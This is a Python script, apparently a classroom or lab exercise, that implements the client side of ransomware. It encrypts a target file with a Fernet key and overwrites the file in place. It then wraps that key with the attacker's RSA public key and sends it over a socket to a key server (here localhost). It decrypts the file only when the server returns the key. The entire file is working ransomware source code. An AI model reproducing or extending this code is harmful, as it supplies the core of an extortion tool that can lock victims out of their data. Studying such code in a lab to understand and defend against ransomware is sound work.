# Cryptography imports for encrypting the keys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

# Socket import for using TCP/IP to connect to the server
import socket

"""
This file is used to encrypt a file using a symmetric key. The symmetric key is encrypted using the public key of the recipient.
The encrypted key is then saved to a file. That key is then used to encrypt a file.
"""

# Using Fetnet to generate a token for the key
symmetricKey = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)

# Opening the public_key to load into memory
with open("./keys/public_key.key", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
        key_file.read(),
        backend=default_backend()
    )

# Creating an encryptedSymmetricKey with the public_key for encryption
# using SHA256
encryptedSymmetricKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# Opening or creating the encrypted key file and writing the encryption to
# it, reading the Fernet Instance and writing the data
with open("./keys/encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)
    filePath = "./ransomware/SecretTextFile.txt"

    with open(filePath, "rb") as file:
        file_data = file.read()
        print(file_data)
        encrypted_data = FernetInstance.encrypt(file_data)

    with open(filePath, "wb") as file:
        file.write(encrypted_data)


def decryptFile(filePath, key):
    FernetInstance = Fernet(key)
    with open(filePath, "rb") as d_file:
        file_data = d_file.read()
        decrypted_data = FernetInstance.decrypt(file_data)

    with open("./ransomware/decryptedTextFile.txt", "wb") as file:
        file.write(decrypted_data)


def sendEncryptedKey(eKeyFilePath):
    with socket.create_connection(("127.0.0.1", 8000)) as sock:
        with open(eKeyFilePath, "rb") as file:
            file_data = file.read()
            sock.send(file_data)
            decryptedSymmetricKey = sock.recv(1024).strip()
            decryptFile("./ransomware/SecretTextFile.txt",
                        decryptedSymmetricKey)


sendEncryptedKey("./keys/encryptedSymmertricKey.key")
quit()
